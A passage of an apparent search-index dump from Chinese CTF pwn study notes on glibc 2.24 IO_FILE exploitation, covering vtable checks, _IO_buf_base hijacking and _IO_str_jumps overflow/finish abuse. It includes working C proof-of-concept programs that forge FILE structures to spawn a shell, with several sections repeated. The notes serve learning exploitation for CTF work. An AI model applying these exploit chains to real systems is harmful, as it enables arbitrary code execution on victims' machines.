_IO_NO_WRITES\u4e3a\u5047 2. (pos = fp->_IO_write_ptr - fp->_IO_write_base) >= ((fp->_IO_buf_end - fp->_IO_buf_base) + flush_only(1)) 3. fp->_flags & _IO_USER_BUF(0x01)\u4e3a\u5047 4. 2*(fp->_IO_buf_end - fp->_IO_buf_base) + 100 \u4e0d\u80fd\u4e3a\u8d1f\u6570 5. new_size = 2 * (fp->_IO_buf_end - fp->_IO_buf_base) + 100; \u5e94\u5f53\u6307\u5411/bin/sh\u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u5730\u5740 6. fp+0xe0\u6307\u5411system\u5730\u5740 \u6784\u9020\uff1a _flags = 0 _IO_write_base = 0 _IO_write_ptr = (binsh_in_libc_addr -100) / 2 +1 _IO_buf_end = (binsh_in_libc_addr -100) / 2 _freeres_list = 0x2 _freeres_buf = 0x3 _mode = -1 vtable = _IO_str_jumps - 0x18 \u793a\u4f8b \u00b6 \u4fee\u6539\u4e86 how2heap \u7684 houseoforange \u4ee3\u7801\uff0c\u53ef\u4ee5\u81ea\u5df1\u52a8\u624b\u8c03\u8bd5\u4e00\u4e0b\u3002 #include <stdio.h> #include <stdlib.h> #include <string.h> int winner ( char *ptr); int main() { char *p1, *p2; size_t io_list_all, *top; // unsorted bin attack p1 = malloc(0x400-16); top = (size_t *) ( (char *) p1 + 0x400 - 16); top[1] = 0xc01; p2 = malloc(0x1000); io_list_all = top[2] + 0x9a8; top[3] = io_list_all - 0x10; // _IO_str_overflow conditions char binsh_in_libc[] = \"/bin/sh\\x00\"; // we can found \"/bin/sh\" in libc, here i create it in stack // top[0] = ~1; // top[0] &= ~8; top[0] = 0; top[4] = 0; // write_base top[5] = ((size_t)&binsh_in_libc-100)/2 + 1; // write_ptr top[7] = 0; // buf_base top[8] = top[5] - 1; // buf_end // house_of_orange conditions top[1] = 0x61; top[20] = (size_t) &top[18]; top[21] = 2; top[22] = 3; top[24] = -1; top[27] = (size_t)stdin - 0x3868-0x18; // _IO_str_jumps\u5730\u5740 top[28] = (size_t) &winner; /* Finally, trigger the whole chain by calling malloc */ malloc(10); return 0; } int winner(char *ptr) { system(ptr); return 0; } _IO_str_jumps -> finish \u00b6 \u539f\u7406\u4e0e\u4e0a\u9762\u7684 _IO_str_jumps -> overflow \u7c7b\u4f3c void _IO_str_finish (_IO_FILE *fp, int dummy) { if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF)) (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base); //[fp+0xe8] fp->_IO_buf_base = NULL; _IO_default_finish (fp, 0); } \u6761\u4ef6\uff1a _IO_buf_base \u4e0d\u4e3a\u7a7a _flags & _IO_USER_BUF(0x01) \u4e3a\u5047 \u6784\u9020\u5982\u4e0b\uff1a _flags = (binsh_in_libc + 0x10) & ~1 _IO_buf_base = binsh_addr _freeres_list = 0x2 _freeres_buf = 0x3 _mode = -1 vtable = _IO_str_finish - 0x18 fp+0xe8 -> system_addr \u793a\u4f8b \u00b6 \u4fee\u6539\u4e86 how2heap \u7684 houseoforange \u4ee3\u7801\uff0c\u53ef\u4ee5\u81ea\u5df1\u52a8\u624b\u8c03\u8bd5\u4e00\u4e0b\u3002 #include <stdio.h> #include <stdlib.h> #include <string.h> int winner ( char *ptr); int main() { char *p1, *p2; size_t io_list_all, *top; // unsorted bin attack p1 = malloc(0x400-16); top = (size_t *) ( (char *) p1 + 0x400 - 16); top[1] = 0xc01; p2 = malloc(0x1000); io_list_all = top[2] + 0x9a8; top[3] = io_list_all - 0x10; // _IO_str_finish conditions char binsh_in_libc[] = \"/bin/sh\\x00\"; // we can found \"/bin/sh\" in libc, here i create it in stack top[0] = ((size_t) &binsh_in_libc + 0x10) & ~1; top[7] = ((size_t)&binsh_in_libc); // buf_base // house_of_orange conditions top[1] = 0x61; top[5] = 0x1 ; //_IO_write_ptr top[20] = (size_t) &top[18]; top[21] = 2; top[22] = 3; top[24] = -1; top[27] = (size_t) stdin - 0x33f0 - 0x18; top[29] = (size_t) &winner; top[30] = (size_t) &top[30]; malloc(10); return 0; } int winner(char *ptr) { system(ptr); return 0; }","title":"libc2.24\u4e0bIO_FILE\u7684\u5229\u7528"},{"location":"Pwn/IO_FILE/glibc2.24%E4%B8%8BIO_FILE%E7%9A%84%E5%88%A9%E7%94%A8/#glibc-224-io_file","text":"","title":"glibc 2.24 \u4e0b IO_FILE \u7684\u5229\u7528"},{"location":"Pwn/IO_FILE/glibc2.24%E4%B8%8BIO_FILE%E7%9A%84%E5%88%A9%E7%94%A8/#_1","text":"\u5728 2.24 \u7248\u672c\u7684 glibc \u4e2d\uff0c\u5168\u65b0\u52a0\u5165\u4e86\u9488\u5bf9 IO_FILE_plus \u7684 vtable \u52ab\u6301\u7684\u68c0\u6d4b\u63aa\u65bd\uff0cglibc \u4f1a\u5728\u8c03\u7528\u865a\u51fd\u6570\u4e4b\u524d\u9996\u5148\u68c0\u67e5 vtable \u5730\u5740\u7684\u5408\u6cd5\u6027\u3002\u9996\u5148\u4f1a\u9a8c\u8bc1 vtable \u662f\u5426\u4f4d\u4e8e_IO_vtable \u6bb5\u4e2d\uff0c\u5982\u679c\u6ee1\u8db3\u6761\u4ef6\u5c31\u6b63\u5e38\u6267\u884c\uff0c\u5426\u5219\u4f1a\u8c03\u7528_IO_vtable_check \u505a\u8fdb\u4e00\u6b65\u68c0\u67e5\u3002 /* Check if unknown vtable pointers are permitted; otherwise, terminate the process. */ void _IO_vtable_check ( void ) attribute_hidden ; /* Perform vtable pointer validation. If validation fails, terminate the process. */ static inline const struct _IO_jump_t * IO_validate_vtable ( const struct _IO_jump_t * vtable ) { /* Fast path: The vtable pointer is within the __libc_IO_vtables section. */ uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables ; uintptr_t ptr = ( uintptr_t ) vtable ; uintptr_t offset = ptr - ( uintptr_t ) __start___libc_IO_vtables ; if ( __glibc_unlikely ( offset >= section_length )) /* The vtable pointer is not in the expected section. Use the slow path, which will terminate the process if necessary. */ _IO_vtable_check (); return vtable ; } \u8ba1\u7b97 section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables; \uff0c\u7d27\u63a5\u7740\u4f1a\u5224\u65ad vtable - __start___libc_IO_vtables \u7684 offset \uff0c\u5982\u679c\u8fd9\u4e2a offset \u5927\u4e8e section_length , \u5373\u5927\u4e8e __stop___libc_IO_vtables - __start___libc_IO_vtables \u90a3\u4e48\u5c31\u4f1a\u8c03\u7528 _IO_vtable_check() \u8fd9\u4e2a\u51fd\u6570\u3002 void attribute_hidden _IO_vtable_check ( void ) { #ifdef SHARED /* Honor the compatibility flag. */ void ( * flag ) ( void ) = atomic_load_relaxed ( & IO_accept_foreign_vtables ); #ifdef PTR_DEMANGLE PTR_DEMANGLE ( flag ); #endif if ( flag == & _IO_vtable_check ) return ; /* In case this libc copy is in a non-default namespace, we always need to accept foreign vtables because there is always a possibility that FILE * objects are passed across the linking boundary. */ { Dl_info di ; struct link_map * l ; if ( _dl_open_hook != NULL || ( _dl_addr ( _IO_vtable_check , & di , & l , NULL ) != 0 && l -> l_ns != LM_ID_BASE )) return ; } #else /* !SHARED */ /* We cannot perform vtable validation in the static dlopen case because FILE * handles might be passed back and forth across the boundary. Therefore, we disable checking in this case. */ if ( __dlopen != NULL ) return ; #endif __libc_fatal ( \"Fatal error: glibc detected an invalid stdio handle \\n \" ); } \u5982\u679c vtable \u662f\u975e\u6cd5\u7684\uff0c\u90a3\u4e48\u4f1a\u5f15\u53d1 abort\u3002 \u8fd9\u91cc\u7684\u68c0\u67e5\u4f7f\u5f97\u4ee5\u5f80\u4f7f\u7528 vtable \u8fdb\u884c\u5229\u7528\u7684\u6280\u672f\u5f88\u96be\u5b9e\u73b0","title":"\u4ecb\u7ecd"},{"location":"Pwn/IO_FILE/glibc2.24%E4%B8%8BIO_FILE%E7%9A%84%E5%88%A9%E7%94%A8/#_2","text":"","title":"\u65b0\u7684\u5229\u7528\u6280\u672f"},{"location":"Pwn/IO_FILE/glibc2.24%E4%B8%8BIO_FILE%E7%9A%84%E5%88%A9%E7%94%A8/#fileno","text":"\u52ab\u6301 _IO_FILE \u7ed3\u6784\u4f53\u7684 _IO_buf_base \u548c _IO_buf_end \u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199 \u5728 vtable \u96be\u4ee5\u88ab\u5229\u7528\u4e4b\u540e\uff0c\u5229\u7528\u7684\u5173\u6ce8\u70b9\u4ece vtable \u8f6c\u79fb\u5230_IO_FILE \u7ed3\u6784\u5185\u90e8\u7684\u57df\u4e2d\u3002 \u524d\u9762\u4ecb\u7ecd\u8fc7_IO_FILE \u5728\u4f7f\u7528\u6807\u51c6 IO \u5e93\u65f6\u4f1a\u8fdb\u884c\u521b\u5efa\u5e76\u8d1f\u8d23\u7ef4\u62a4\u4e00\u4e9b\u76f8\u5173\u4fe1\u606f\uff0c\u5176\u4e2d\u6709\u4e00\u4e9b\u57df\u662f\u8868\u793a\u8c03\u7528\u8bf8\u5982 fwrite\u3001fread \u7b49\u51fd\u6570\u65f6\u5199\u5165\u5730\u5740\u6216\u8bfb\u53d6\u5730\u5740\u7684\uff0c\u5982\u679c\u53ef\u4ee5\u63a7\u5236\u8fd9\u4e9b\u6570\u636e\u5c31\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u6216\u4efb\u610f\u5730\u5740\u8bfb\u3002 struct _IO_FILE { int _flags ; /* High-order word is _IO_MAGIC; rest is flags. */ /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char * _IO_read_ptr ; /* Current read pointer */ char * _IO_read_end ; /* End of get area. */ char * _IO_read_base ; /* Start of putback+get area. */ char * _IO_write_base ; /* Start of put area. */ char * _IO_write_ptr ; /* Current put pointer. */ char * _IO_write_end ; /* End of put area. */ char * _IO_buf_base ; /* Start of reserve area. */ char * _IO_buf_end ; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char * _IO_save_base ; /* Pointer to start of non-current get area. */ char * _IO_backup_base ; /* Pointer to first valid character of backup area */ char * _IO_save_end ; /* Pointer to end of non-current get area. */ struct _IO_marker * _markers ; struct _IO_FILE * _chain ; int _fileno ; int _flags2 ; _IO_off_t _old_offset ; /* This used to be _offset but it's too small. */ }; \u56e0\u4e3a\u8fdb\u7a0b\u4e2d\u5305\u542b\u4e86\u7cfb\u7edf\u9ed8\u8ba4\u7684\u4e09\u4e2a\u6587\u4ef6\u6d41 stdin\\stdout\\stderr\uff0c\u56e0\u6b64\u8fd9\u79cd\u65b9\u5f0f\u53ef\u4ee5\u4e0d\u9700\u8981\u8fdb\u7a0b\u4e2d\u5b58\u5728\u6587\u4ef6\u64cd\u4f5c\uff0c\u901a\u8fc7 scanf\\printf \u4e00\u6837\u53ef\u4ee5\u8fdb\u884c\u5229\u7528\u3002 \u5728_IO_FILE \u4e2d_IO_buf_base \u8868\u793a\u64cd\u4f5c\u7684\u8d77\u59cb\u5730\u5740\uff0c_IO_buf_end \u8868\u793a\u7ed3\u675f\u5730\u5740\uff0c\u901a\u8fc7\u63a7\u5236\u8fd9\u4e24\u4e2a\u6570\u636e\u53ef\u4ee5\u5b9e\u73b0\u63a7\u5236\u8bfb\u5199\u7684\u64cd\u4f5c\u3002","title":"fileno \u4e0e\u7f13\u51b2\u533a\u7684\u76f8\u5173\u5229\u7528"},{"location":"Pwn/IO_FILE/glibc2.24%E4%B8%8BIO_FILE%E7%9A%84%E5%88%A9%E7%94%A8/#_3","text":"\u7b80\u5355\u7684\u89c2\u5bdf\u4e00\u4e0b_IO_FILE \u5bf9\u4e8e\u8c03\u7528 scanf \u7684\u4f5c\u7528 #include \"stdio.h\" char buf [ 100 ]; int main () { char stack_buf [ 100 ]; scanf ( \"%s\" , stack_buf ); scanf ( \"%s\" , stack_buf ); } \u5728\u6267\u884c\u7a0b\u5e8f\u7b2c\u4e00\u6b21\u4f7f\u7528 stdin \u4e4b\u524d\uff0cstdin \u7684\u5185\u5bb9\u8fd8\u672a\u521d\u59cb\u5316\u662f\u7a7a\u7684 0x7ffff7dd18e0 <_IO_2_1_stdin_>: 0x00000000fbad2088 0x0000000000000000 0x7ffff7dd18f0 <_IO_2_1_stdin_+16>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1900 <_IO_2_1_stdin_+32>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1910 <_IO_2_1_stdin_+48>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1920 <_IO_2_1_stdin_+64>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1930 <_IO_2_1_stdin_+80>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1940 <_IO_2_1_stdin_+96>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1950 <_IO_2_1_stdin_+112>: 0x0000000000000000 0xffffffffffffffff 0x7ffff7dd1960 <_IO_2_1_stdin_+128>: 0x0000000000000000 0x00007ffff7dd3790 0x7ffff7dd1970 <_IO_2_1_stdin_+144>: 0xffffffffffffffff 0x0000000000000000 0x7ffff7dd1980 <_IO_2_1_stdin_+160>: 0x00007ffff7dd19c0 0x0000000000000000 0x7ffff7dd1990 <_IO_2_1_stdin_+176>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd19a0 <_IO_2_1_stdin_+192>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd19b0 <_IO_2_1_stdin_+208>: 0x0000000000000000 0x00007ffff7dd06e0 <== vtable \u8c03\u7528 scanf \u4e4b\u540e\u53ef\u4ee5\u770b\u5230_IO_read_ptr\u3001_IO_read_base\u3001_IO_read_end\u3001_IO_buf_base\u3001_IO_buf_end \u7b49\u57df\u90fd\u88ab\u521d\u59cb\u5316 0x7ffff7dd18e0 <_IO_2_1_stdin_>: 0x00000000fbad2288 0x0000000000602013 0x7ffff7dd18f0 <_IO_2_1_stdin_+16>: 0x0000000000602014 0x0000000000602010 0x7ffff7dd1900 <_IO_2_1_stdin_+32>: 0x0000000000602010 0x0000000000602010 0x7ffff7dd1910 <_IO_2_1_stdin_+48>: 0x0000000000602010 0x0000000000602010 0x7ffff7dd1920 <_IO_2_1_stdin_+64>: 0x0000000000602410 0x0000000000000000 0x7ffff7dd1930 <_IO_2_1_stdin_+80>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1940 <_IO_2_1_stdin_+96>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1950 <_IO_2_1_stdin_+112>: 0x0000000000000000 0xffffffffffffffff 0x7ffff7dd1960 <_IO_2_1_stdin_+128>: 0x0000000000000000 0x00007ffff7dd3790 0x7ffff7dd1970 <_IO_2_1_stdin_+144>: 0xffffffffffffffff 0x0000000000000000 0x7ffff7dd1980 <_IO_2_1_stdin_+160>: 0x00007ffff7dd19c0 0x0000000000000000 0x7ffff7dd1990 <_IO_2_1_stdin_+176>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd19a0 <_IO_2_1_stdin_+192>: 0x00000000ffffffff 0x0000000000000000 0x7ffff7dd19b0 <_IO_2_1_stdin_+208>: 0x0000000000000000 0x00007ffff7dd06e0 \u8fdb\u4e00\u6b65\u601d\u8003\u53ef\u4ee5\u53d1\u73b0\u5176\u5b9e stdin \u521d\u59cb\u5316\u7684\u5185\u5b58\u662f\u5728\u5806\u4e0a\u5206\u914d\u51fa\u6765\u7684\uff0c\u5728\u8fd9\u91cc\u5806\u7684\u57fa\u5740\u662f 0x602000\uff0c\u56e0\u4e3a\u4e4b\u524d\u6ca1\u6709\u5806\u5206\u914d\u56e0\u6b64\u7f13\u51b2\u533a\u7684\u5730\u5740\u4e5f\u662f 0x602010 Start End Offset Perm Path 0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/\u684c\u9762/tst/1/t1 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/\u684c\u9762/tst/1/t1 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/\u684c\u9762/tst/1/t1 0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap] \u5206\u914d\u7684\u5806\u5927\u5c0f\u662f 0x400 \u4e2a\u5b57\u8282\uff0c\u6b63\u597d\u5bf9\u5e94\u4e8e_IO_buf_base\uff5e_IO_buf_end \u5728\u8fdb\u884c\u5199\u5165\u540e\uff0c\u53ef\u4ee5\u770b\u5230\u7f13\u51b2\u533a\u4e2d\u6709\u6211\u4eec\u5199\u5165\u7684\u6570\u636e\uff0c\u4e4b\u540e\u76ee\u7684\u5730\u5740\u6808\u4e2d\u7684\u7f13\u51b2\u533a\u4e5f\u4f1a\u5199\u5165\u6570\u636e 0x602000: 0x0000000000000000 0x0000000000000411 <== \u5206\u914d0x400\u5927\u5c0f 0x602010: 0x000000000a333231 0x0000000000000000 <== \u7f13\u51b2\u6570\u636e 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 \u63a5\u4e0b\u6765\u6211\u4eec\u5c1d\u8bd5\u4fee\u6539_IO_buf_base \u6765\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u8bfb\u5199\uff0c\u5168\u5c40\u7f13\u51b2\u533a buf \u7684\u5730\u5740\u662f 0x7ffff7dd2740\u3002\u4fee\u6539_IO_buf_base \u548c_IO_buf_end \u5230\u7f13\u51b2\u533a buf \u7684\u5730\u5740 0x7ffff7dd18e0 <_IO_2_1_stdin_>: 0x00000000fbad2288 0x0000000000602013 0x7ffff7dd18f0 <_IO_2_1_stdin_+16>: 0x0000000000602014 0x0000000000602010 0x7ffff7dd1900 <_IO_2_1_stdin_+32>: 0x0000000000602010 0x0000000000602010 0x7ffff7dd1910 <_IO_2_1_stdin_+48>: 0x0000000000602010 0x00007ffff7dd2740 <== _IO_buf_base 0x7ffff7dd1920 <_IO_2_1_stdin_+64>: 0x00007ffff7dd27c0 0x0000000000000000 <== _IO_buf_end 0x7ffff7dd1930 <_IO_2_1_stdin_+80>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1940 <_IO_2_1_stdin_+96>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1950 <_IO_2_1_stdin_+112>: 0x0000000000000000 0xffffffffffffffff 0x7ffff7dd1960 <_IO_2_1_stdin_+128>: 0x0000000000000000 0x00007ffff7dd3790 0x7ffff7dd1970 <_IO_2_1_stdin_+144>: 0xffffffffffffffff 0x0000000000000000 0x7ffff7dd1980 <_IO_2_1_stdin_+160>: 0x00007ffff7dd19c0 0x0000000000000000 0x7ffff7dd1990 <_IO_2_1_stdin_+176>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd19a0 <_IO_2_1_stdin_+192>: 0x00000000ffffffff 0x0000000000000000 0x7ffff7dd19b0 <_IO_2_1_stdin_+208>: 0x0000000000000000 0x00007ffff7dd06e0 \u4e4b\u540e scanf \u7684\u8bfb\u5165\u6570\u636e\u5c31\u4f1a\u5199\u5165\u5230 0x7ffff7dd2740 \u7684\u4f4d\u7f6e 0x7ffff7dd2740 <buf>: 0x00000a6161616161 0x0000000000000000 0x7ffff7dd2750 <buffer>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd2760 <buffer>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd2770 <buffer>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd2780 <buffer>: 0x0000000000000000 0x0000000000000000","title":"\u793a\u4f8b"},{"location":"Pwn/IO_FILE/glibc2.24%E4%B8%8BIO_FILE%E7%9A%84%E5%88%A9%E7%94%A8/#_io_str_jumps-overflow","text":"\u52a0\u5165\u7684\u662f check \u662f\u9488\u5bf9 _IO_FILE_plus \u7684 vtable \u68c0\u67e5\uff0c\u6ca1\u6709\u5bf9 _IO_str_jumps vtable \u8fdb\u884c\u68c0\u67e5\u3002\u52ab\u6301\u8fd9\u4e2a\u540e\u8005\u7684 vtable \uff0c\u627e\u8c03\u7528\u8fd9\u4e2a\u865a\u51fd\u6570\u7684\u51fd\u6570\u8fd0\u884c getshell libc \u4e2d\u4e0d\u4ec5\u4ec5\u53ea\u6709 _IO_file_jumps \u8fd9\u4e48\u4e00\u4e2a vtable \uff0c\u8fd8\u6709\u4e00\u4e2a\u53eb _IO_str_jumps \u7684 \uff0c\u8fd9\u4e2a vtable \u4e0d\u5728 check \u8303\u56f4\u4e4b\u5185\u3002 const struct _IO_jump_t _IO_str_jumps libio_vtable = { JUMP_INIT_DUMMY, JUMP_INIT(finish, _IO_str_finish), JUMP_INIT(overflow, _IO_str_overflow), JUMP_INIT(underflow, _IO_str_underflow), JUMP_INIT(uflow, _IO_default_uflow), JUMP_INIT(pbackfail, _IO_str_pbackfail), JUMP_INIT(xsputn, _IO_default_xsputn), JUMP_INIT(xsgetn, _IO_default_xsgetn), JUMP_INIT(seekoff, _IO_str_seekoff), JUMP_INIT(seekpos, _IO_default_seekpos), JUMP_INIT(setbuf, _IO_default_setbuf), JUMP_INIT(sync, _IO_default_sync), JUMP_INIT(doallocate, _IO_default_doallocate), JUMP_INIT(read, _IO_default_read), JUMP_INIT(write, _IO_default_write), JUMP_INIT(seek, _IO_default_seek), JUMP_INIT(close, _IO_default_close), JUMP_INIT(stat, _IO_default_stat), JUMP_INIT(showmanyc, _IO_default_showmanyc), JUMP_INIT(imbue, _IO_default_imbue) }; \u5982\u679c\u6211\u4eec\u80fd\u8bbe\u7f6e\u6587\u4ef6\u6307\u9488\u7684 vtable \u4e3a _IO_str_jumps \u4e48\u5c31\u80fd\u8c03\u7528\u4e0d\u4e00\u6837\u7684\u6587\u4ef6\u64cd\u4f5c\u51fd\u6570\u3002\u8fd9\u91cc\u4ee5 _IO_str_overflow \u4e3a\u4f8b\u5b50\uff1a int _IO_str_overflow ( _IO_FILE * fp , int c ) { int flush_only = c == EOF ; _IO_size_t pos ; if ( fp -> _flags & _IO_NO_WRITES ) // pass return flush_only ? 0 : EOF ; if (( fp -> _flags & _IO_TIED_PUT_GET ) && ! ( fp -> _flags & _IO_CURRENTLY_PUTTING )) { fp -> _flags |= _IO_CURRENTLY_PUTTING ; fp -> _IO_write_ptr = fp -> _IO_read_ptr ; fp -> _IO_read_ptr = fp -> _IO_read_end ; } pos = fp -> _IO_write_ptr - fp -> _IO_write_base ; if ( pos >= ( _IO_size_t ) ( _IO_blen ( fp ) + flush_only )) // should in { if ( fp -> _flags & _IO_USER_BUF ) /* not allowed to enlarge */ // pass return EOF ; else { char * new_buf ; char * old_buf = fp -> _IO_buf_base ; size_t old_blen = _IO_blen ( fp ); _IO_size_t new_size = 2 * old_blen + 100 ; if ( new_size < old_blen ) //pass \u4e00\u822c\u4f1a\u901a\u8fc7 return EOF ; new_buf = ( char * ) ( * (( _IO_strfile * ) fp ) -> _s . _allocate_buffer ) ( new_size ); //target [fp+0xe0] if ( new_buf == NULL ) { /* __ferror(fp) = 1; */ return EOF ; } if ( old_buf ) { memcpy ( new_buf , old_buf , old_blen ); ( * (( _IO_strfile * ) fp ) -> _s . _free_buffer ) ( old_buf ); /* Make sure _IO_setb won't try to delete _IO_buf_base. */ fp -> _IO_buf_base = NULL ; } memset ( new_buf + old_blen , '\\0' , new_size - old_blen ); _IO_setb ( fp , new_buf , new_buf + new_size , 1 ); fp -> _IO_read_base = new_buf + ( fp -> _IO_read_base - old_buf ); fp -> _IO_read_ptr = new_buf + ( fp -> _IO_read_ptr - old_buf ); fp -> _IO_read_end = new_buf + ( fp -> _IO_read_end - old_buf ); fp -> _IO_write_ptr = new_buf + ( fp -> _IO_write_ptr - old_buf ); fp -> _IO_write_base = new_buf ; fp -> _IO_write_end = fp -> _IO_buf_end ; } } if ( ! flush_only ) * fp -> _IO_write_ptr ++ = ( unsigned char ) c ; if ( fp -> _IO_write_ptr > fp -> _IO_read_end ) fp -> _IO_read_end = fp -> _IO_write_ptr ; return c ; } libc_hidden_def ( _IO_str_overflow ) \u5229\u7528\u4ee5\u4e0b\u4ee3\u7801\u6765\u52ab\u6301\u7a0b\u5e8f\u6d41\u7a0b new_buf = ( char * ) ( * (( _IO_strfile * ) fp ) -> _s . _allocate_buffer ) ( new_size ); \u51e0\u4e2a\u6761\u4ef6 bypass\uff1a 1. fp->_flags & _IO_NO_WRITES\u4e3a\u5047 2. (pos = fp->_IO_write_ptr - fp->_IO_write_base) >= ((fp->_IO_buf_end - fp->_IO_buf_base) + flush_only(1)) 3. fp->_flags & _IO_USER_BUF(0x01)\u4e3a\u5047 4. 2*(fp->_IO_buf_end - fp->_IO_buf_base) + 100 \u4e0d\u80fd\u4e3a\u8d1f\u6570 5. new_size = 2 * (fp->_IO_buf_end - fp->_IO_buf_base) + 100; \u5e94\u5f53\u6307\u5411/bin/sh\u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u5730\u5740 6. fp+0xe0\u6307\u5411system\u5730\u5740 \u6784\u9020\uff1a _flags = 0 _IO_write_base = 0 _IO_write_ptr = (binsh_in_libc_addr -100) / 2 +1 _IO_buf_end = (binsh_in_libc_addr -100) / 2 _freeres_list = 0x2 _freeres_buf = 0x3 _mode = -1 vtable = _IO_str_jumps - 0x18","title":"_IO_str_jumps -&gt; overflow"},{"location":"Pwn/IO_FILE/glibc2.24%E4%B8%8BIO_FILE%E7%9A%84%E5%88%A9%E7%94%A8/#_4","text":"\u4fee\u6539\u4e86 how2heap \u7684 houseoforange \u4ee3\u7801\uff0c\u53ef\u4ee5\u81ea\u5df1\u52a8\u624b\u8c03\u8bd5\u4e00\u4e0b\u3002 #include <stdio.h> #include <stdlib.h> #include <string.h> int winner ( char *ptr); int main() { char *p1, *p2; size_t io_list_all, *top; // unsorted bin attack p1 = malloc(0x400-16); top = (size_t *) ( (char *) p1 + 0x400 - 16); top[1] = 0xc01; p2 = malloc(0x1000); io_list_all = top[2] + 0x9a8; top[3] = io_list_all - 0x10; // _IO_str_overflow conditions char binsh_in_libc[] = \"/bin/sh\\x00\"; // we can found \"/bin/sh\" in libc, here i create it in stack // top[0] = ~1; // top[0] &= ~8; top[0] = 0; top[4] = 0; // write_base top[5] = ((size_t)&binsh_in_libc-100)/2 + 1; // write_ptr top[7] = 0; // buf_base top[8] = top[5] - 1; // buf_end // house_of_orange conditions top[1] = 0x61; top[20] = (size_t) &top[18]; top[21] = 2; top[22] = 3; top[24] = -1; top[27] = (size_t)stdin - 0x3868-0x18; // _IO_str_jumps\u5730\u5740 top[28] = (size_t) &winner; /* Finally, trigger the whole chain by calling malloc */ malloc(10); return 0; } int winner(char *ptr) { system(ptr); return 0; }","title":"\u793a\u4f8b"},{"location":"Pwn/IO_FILE/glibc2.24%E4%B8%8BIO_FILE%E7%9A%84%E5%88%A9%E7%94%A8/#_io_str_jumps-finish","text":"\u539f\u7406\u4e0e\u4e0a\u9762\u7684 _IO_str_jumps -> overflow \u7c7b\u4f3c void _IO_str_finish (_IO_FILE *fp, int dummy) { if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF)) (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base); //[fp+0xe8] fp->_IO_buf_base = NULL; _IO_default_finish (fp, 0); } \u6761\u4ef6\uff1a _IO_buf_base \u4e0d\u4e3a\u7a7a _flags & _IO_USER_BUF(0x01) \u4e3a\u5047 \u6784\u9020\u5982\u4e0b\uff1a _flags = (binsh_in_libc + 0x10) & ~1 _IO_buf_base = binsh_addr _freeres_list = 0x2 _freeres_buf = 0x3 _mode = -1 vtable = _IO_str_finish - 0x18 fp+0xe8 -> system_addr","title":"_IO_str_jumps -&gt; finish"},{"location":"Pwn/IO_FILE/glibc2.24%E4%B8%8BIO_FILE%E7%9A%84%E5%88%A9%E7%94%A8/#_5","text":"\u4fee\u6539\u4e86 how2heap \u7684 houseoforange \u4ee3\u7801\uff0c\u53ef\u4ee5\u81ea\u5df1\u52a8\u624b\u8c03\u8bd5\u4e00\u4e0b\u3002 #include <stdio.h> #include <stdlib.h> #include <string.h> int winner ( char *ptr); int main() { char *p1, *p2; size_t io_list_all, *top; // unsorted bin attack p1 = malloc(0x400-16); top = (size_t *) ( (char *) p1 + 0x400 - 16); top[1] = 0xc01; p2 = malloc(0x1000); io_list_all = top[2] + 0x9a8; top[3] = io_list_all - 0x10; // _IO_str_finish conditions char binsh_in_libc[] = \"/bin/sh\\x00\"; // we can found \"/bin/sh\" in libc, here i create it in stack top[0] = ((size_t) &binsh_in_libc + 0x10) & ~1; top[7] = ((size_t)&binsh_in_libc); // buf_base // house_of_orange conditions top[1] = 0x61; top[5] = 0x1 ; //_IO_write_ptr top[20] = (size_t) &top[18]; top[21] = 2; top[22] = 3; top[24] = -1; top[27] = (size_t) stdin - 0x33f0 - 0x18; top[29] = (size_t) &winner; top[30] = (size_t) &top[30]; malloc(10); return 0; } int winner(char *ptr) { system(ptr); return 0; }","title":"\u793a\u4f8b"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/","text":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u57fa\u7840\u4f8b\u5b50 \u00b6 \u7edd\u5927\u90e8\u5206\u5185\u5bb9\u6765\u81ea CTF-WIKI \uff0c\u5185\u5bb9\u5f15\u7528\u7528\u4e8e\u5b66\u4e60\u8bb0\u5f55 64 \u4f4d\u7a0b\u5e8f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e \u00b6 \u539f\u7406 \u00b6 \u5176\u5b9e 64 \u4f4d\u7684\u504f\u79fb\u8ba1\u7b97\u548c 32 